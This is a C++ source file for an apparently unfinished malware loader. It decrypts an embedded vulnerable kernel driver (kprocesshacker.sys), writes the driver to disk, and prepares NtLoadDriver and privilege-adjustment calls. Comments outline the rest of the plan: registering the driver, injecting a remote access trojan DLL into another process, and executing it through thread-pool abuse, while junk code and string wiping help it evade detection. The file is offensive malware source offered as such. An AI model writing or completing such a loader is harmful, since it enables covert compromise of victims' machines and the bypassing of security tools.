#include <vector>
#include <windows.h>
#include <fstream>
#include "byte_encryption.h"
#include "resources.h"
#include "junk_codes.h"

typedef NTSTATUS (*NTAPI RtlAdjustPrivilege_t)(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN Client,
    PBOOLEAN WasEnabled
);

typedef NTSTATUS (*NTAPI NtLoadDriver_t)(
    PUNICODE_STRING DriverServiceName
);

int main(int argc, char** argv)
{
	// Load the vulnerable driver: kprocesshacker.sys
    /*
    * Decrypt the driver from memory
    * Write the driver to disk (to System32)
    * Create the registry path
    * call NtLoadDriver()
    * - Possibly unload the driver after injecting
    */
    
    // Decrypt the driver path to write to disk
    std::string kphDriverDesiredPath = decrypt_string(str_kphDriverPathOnDisk);
    std::ofstream driver_ofstream(kphDriverDesiredPath.c_str(), std::ios::binary);
    wipeStr(kphDriverDesiredPath);

    // Decrypt the driver from memory and write it to disk
    std::vector<uint8_t> kph_driver = decrypt_bytes(kprocesshacker_driver_encrypted);
    if (!driver_ofstream.write(reinterpret_cast<const char*>(kph_driver.data()), kph_driver.size()))
    {
#ifdef _DEBUG
        std::cerr << "Error: Could not write the vulnerable driver to disk." << std::endl;
#endif 
        return -1;
    }
    wipeBytes(kph_driver);
    
    // Create the driver service keys in the registry
    
        



    // Inject the RAT dll to the target process's virtual memory (after performing relocations)

    // Execute the AddressOfEntryPoint of the dll in the target process via abusing Thread pools (PoolParty)
    
	return 0;
}